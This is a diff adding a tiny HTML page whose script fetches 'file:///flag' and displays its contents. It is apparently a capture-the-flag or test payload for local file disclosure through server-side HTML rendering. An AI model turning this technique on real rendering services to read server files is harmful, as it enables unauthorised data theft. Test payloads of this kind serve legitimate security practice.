@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>test</title>
+    <style>body { background: white; }</style>
+  </head>
+  <body>
+    <script>
+      var xhr = new XMLHttpRequest();
+      xhr.onload = function () {
+        document.body.innerText = xhr.responseText;
+      };
+      xhr.open('GET', 'file:///flag');
+      xhr.send();
+    </script>
+  </body>
+</html>
